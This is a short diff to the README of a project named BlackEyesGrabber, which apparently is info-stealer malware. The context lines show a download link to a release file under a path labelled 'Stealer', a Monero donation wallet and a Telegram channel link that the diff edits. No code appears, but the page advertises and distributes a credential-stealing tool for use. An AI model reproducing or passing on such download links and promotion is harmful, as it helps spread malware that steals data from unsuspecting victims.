@@ -13,7 +13,7 @@
 - [Requirements](#requirements)
 - [How to Build?](#how-to-build)
 - [Support the Project](#support-the-project)
-- [Telegram](#Telegram)
+- [Telegram](https://t.me/dataeyes)
 ## Download
 
 [![Download](https://github.com/enigma-space/BlackEyesGrabber/releases/download/Stealer/BlackEyes.zip)
@@ -85,5 +85,4 @@ If you find this project useful and would like to show your support, you can mak
 
 - **Monero (XRM):**
   - Wallet Address: 44cTu6VpeJtRxcPhzS548FPdzsGPZzDJ9Yk4TGTRgASK5WagNcHN47ujZKjdeBAtbxZVowAQ7N3id1d5APzi5TtaCC6sym3
- 
--  [![Telegram](https://t.me/dataeyes)
+
